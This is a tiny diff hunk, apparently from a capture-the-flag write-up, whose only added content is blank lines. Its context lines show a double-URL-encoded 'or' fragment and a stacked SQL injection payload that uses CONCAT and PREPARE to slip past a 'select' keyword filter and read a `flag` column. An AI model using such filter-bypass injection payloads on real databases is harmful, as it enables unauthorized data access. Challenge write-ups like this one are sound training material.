@@ -246,3 +246,5 @@ or ---  %25%36%66%25%37%32
 set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
 ```
 
+
+
